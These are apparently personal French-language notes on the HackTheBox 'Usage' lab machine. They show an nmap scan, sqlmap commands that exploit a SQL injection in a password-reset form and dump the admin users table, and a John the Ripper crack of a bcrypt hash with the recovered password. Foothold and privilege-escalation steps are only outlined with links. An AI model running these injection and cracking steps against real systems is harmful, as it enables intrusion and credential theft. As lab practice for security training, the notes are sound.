└─$ nmap -Pn -sVC -T4 usage.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 19:07 GMT
Nmap scan report for usage.htb (10.129.1.195)
Host is up (0.089s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Daily Blogs
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

![[Pasted image 20240430175952.png]]
# exploit
Cette partie est vulnérable à #Injection_SQL
`http://usage.htb/forget-password`
Il faut copier la requête à partir de burpsuit puis :
```
sqlmap -r sql.txt -p email --batch --level=5 --risk=3 --dbms=mysql --dbs --threads=10
```
	available databases [3]:
	[*] information_schema
	[*] performance_schema
	[*] usage_blog

```
sqlmap -r sql.txt --level=5 --risk=3 --threads=10 --batch -D usage_blog --tables
```
	| admin_menu             |
	| admin_operation_log    |
	| admin_permissions      |
	| admin_role_menu        |
	| admin_role_permissions |
	| admin_role_users       |
	| admin_roles            |
	| admin_user_permissions |
	| admin_users            |
	| blog                   |
	| failed_jobs            |
	| migrations             |
	| password_reset_tokens  |
	| personal_access_tokens |
	| users |

```
sqlmap -r sql.txt --threads=10 --level=5 --risk=3 --batch -D usage_blog -T admin_users --dump
```

```
john hash -w=/usr/share/wordlists/rockyou.txt
```
	Using default input encoding: UTF-8
	Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
	Cost 1 (iteration count) is 1024 for all loaded hashes
	Will run 4 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	whatever1        (?)     
	1g 0:00:00:17 DONE (2024-04-28 01:51) 0.05882g/s 95.29p/s 95.29c/s 95.29C/s alexis1..serena
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed.

# foothold
exploit lavarel-admin interface
https://flyd.uk/post/cve-2023-24249/


# privesc
## lateral movement
~ cat .monitrc
## exploit [7z](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----f1c2793eeb7e--------------------------------) 
